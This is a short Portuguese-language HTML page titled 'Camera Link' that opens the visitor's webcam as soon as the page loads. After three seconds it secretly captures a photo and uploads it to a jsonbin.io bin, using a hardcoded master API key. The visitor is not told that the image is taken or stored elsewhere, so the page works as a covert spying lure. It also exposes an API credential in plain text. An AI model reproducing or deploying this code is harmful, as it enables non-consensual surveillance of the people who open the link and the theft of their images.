<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Camera Link</title>
</head>
<body>

<h2>Abrindo câmera...</h2>
<video id="video" autoplay playsinline width="300"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const BIN_ID = "69d65f7036566621a88f23ad";
const API_KEY = "$2a$10$TGWviiTU6WDwbnoyxXdO1OB.zfLXw2aPhoG4SChWWQYA757BpZBqO";

async function startCamera() {
  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
  document.getElementById("video").srcObject = stream;

  setTimeout(captureAndSend, 3000);
}

async function captureAndSend() {
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  const ctx = canvas.getContext("2d");

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  ctx.drawImage(video, 0, 0);

  const image = canvas.toDataURL("image/png");

  await salvarImagem(image);
}

async function salvarImagem(base64) {
  let res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
    headers: {
      "X-Master-Key": API_KEY
    }
  });

  let data = await res.json();
  let imagens = data.record || [];

  imagens.push(base64);

  await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
    method: "PUT",
    headers: {
      "Content-Type": "application/json",
      "X-Master-Key": API_KEY
    },
    body: JSON.stringify({
      record: imagens
    })
  });

  console.log("Imagem enviada!");
}

startCamera();
</script>

</body>
</html>
